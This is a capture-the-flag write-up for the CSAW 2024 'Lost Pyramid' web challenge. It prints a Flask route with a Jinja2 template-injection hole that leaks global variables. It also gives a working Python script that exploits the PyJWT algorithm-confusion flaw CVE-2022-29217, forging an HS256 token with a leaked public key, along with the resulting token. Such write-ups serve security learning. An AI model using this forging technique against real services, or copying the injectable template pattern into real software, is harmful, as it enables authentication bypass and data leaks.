+++
title = 'CSAW CTF Qualification Round 2024 Lost Pyramid'
date = 2024-09-07T12:17:23+02:00
categories = ['CSAW CTF Qualification Round 2024', 'Web']
+++

## Initial Code Analysis

First thing that catches our eye is the old version *2.3.0* of *PyJWT* used in the application.

![Alt text](image.png)

In order to access the flag, we need to view *kings_lair.html* which requires sending a JWT with specific *CURRENT_DATE* and *ROLE*.

![Alt text](image-1.png)

The scarab room seems vulnerable to SSTI via *name* POST param.

```python
app.route('/scarab_room', methods=['GET', 'POST'])
def scarab_room():
    try:
        if request.method == 'POST':
            name = request.form.get('name')
            if name:
                kings_safelist = ['{','}', '𓁹', '𓆣','𓀀', '𓀁', '𓀂', '𓀃', '𓀄', '𓀅', '𓀆', '𓀇', '𓀈', '𓀉', '𓀊', 
                                    '𓀐', '𓀑', '𓀒', '𓀓', '𓀔', '𓀕', '𓀖', '𓀗', '𓀘', '𓀙', '𓀚', '𓀛', '𓀜', '𓀝', '𓀞', '𓀟',
                                    '𓀠', '𓀡', '𓀢', '𓀣', '𓀤', '𓀥', '𓀦', '𓀧', '𓀨', '𓀩', '𓀪', '𓀫', '𓀬', '𓀭', '𓀮', '𓀯',
                                    '𓀰', '𓀱', '𓀲', '𓀳', '𓀴', '𓀵', '𓀶', '𓀷', '𓀸', '𓀹', '𓀺', '𓀻']  

                name = ''.join([char for char in name if char.isalnum() or char in kings_safelist])

                
                return render_template_string('''
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        OMITTED
                    </head>
                    <body>
                        <a href="{{ url_for('hallway') }}" class="return-link">RETURN</a>
                        
                        {% if name %}
                            <h1>𓁹𓁹𓁹 Welcome to the Scarab Room, '''+ name + ''' 𓁹𓁹𓁹</h1>
                        {% endif %}
                        
                    </body>
                    </html>
                ''', name=name, **globals())
    except Exception as e:
        pass

    return render_template('scarab_room.html')
```

## Leaking Information via Scarab Room

Since both *{* and *}* are in *kings_safelist*, we can send a Jinja2 expression in *name* to *scarab_room*. This allows us to leak any alphanumerical global variables by sending *{{VARIABLE}}*, since *\*\*globals()* are included. Looking at the code, we can leak *KINGSDAY* and *PUBLICKEY* this way, but not *PRIVATE_KEY*, since it contains an underscore which isn't permitted.

![Alt text](image-2.png)

![Alt text](image-3.png)

![Alt text](image-4.png)

## CVE-2022-29217

PyJWT up to version 2.4.0 is vulnerable to [CVE-2022-29217](https://nvd.nist.gov/vuln/detail/CVE-2022-29217). The CVE description states:
> The application can specify `jwt.algorithms.get_default_algorithms()` to get support for all algorithms, or specify a single algorithm. The issue is not that big as `algorithms=jwt.algorithms.get_default_algorithms()` has to be used.

As we can see in the code, that's exactly what's used in *kings_lair*.

![Alt text](image-5.png)

This [advisory](https://github.com/advisories/GHSA-ffqj-6fqr-9h24) states that:

> Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is
> not a public key meant for asymmetric algorithm i.e. HMAC cannot be used
> if the key begins with "ssh-rsa". If HMAC is used with a public key, the
> attacker can just use the publicly known public key to sign the token
> and the checker would use the same key to verify.
>
> From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm.
> With ed25519, PyJWT supports public keys that start with "ssh-", for
> example "ssh-ed25519".

Perfect, we leaked the public ssh-ed25519 key and we can use it to sign a JWT forged by ourselves and make the library use the same public key for verification. We save the previously leaked key as *ssh-key.pub* and modify the advisory code as follows and save it as *solve.py*.

```python
import jwt

# Open and read the SSH public key
with open("ssh-key.pub", "rb") as ssh_file:
    ssh_key_bytes = ssh_file.read()

# Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret
encoded_bad = jwt.encode({
  "ROLE": "royalty",
  "CURRENT_DATE": "03_07_1341_BC",
  "exp": 96333638593
}, ssh_key_bytes, algorithm="HS256")

print(encoded_bad)
```

Notice that we used the previously leaked *KINGSDAY* for *CURRENT_DATE* and *royalty* for *ROLE*. Now, we create a new venv and install the exact same versions of libraries as in the app.

```bash
vboxuser@kali /mnt/repos/csawctf-2024/lost-pyramid $ python3 -m venv venv
vboxuser@kali /mnt/repos/csawctf-2024/lost-pyramid $ source ./venv/bin/activate              
(venv) vboxuser@kali /mnt/repos/csawctf-2024/lost-pyramid $ pip3 install PyJWT==2.3.0 cryptography==43.0.0
```

Finally, we run the program to generate the JWT.

```bash
(venv) vboxuser@kali /mnt/repos/csawctf-2024/lost-pyramid $ python3 solve.py                              
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJST0xFIjoicm95YWx0eSIsIkNVUlJFTlRfREFURSI6IjAzXzA3XzEzNDFfQkMiLCJleHAiOjk2MzMzNjM4NTkzfQ.TNLuFhoPwtH1_ehX-z42hM6nA1UiNNb-PYsyuFhYiwA
```

We copy the generated JWT and access *kings_lair* with it to get the flag.

![Alt text](image-6.png)

The final flag is: *csawctf{$$king$_confusion$$$}*.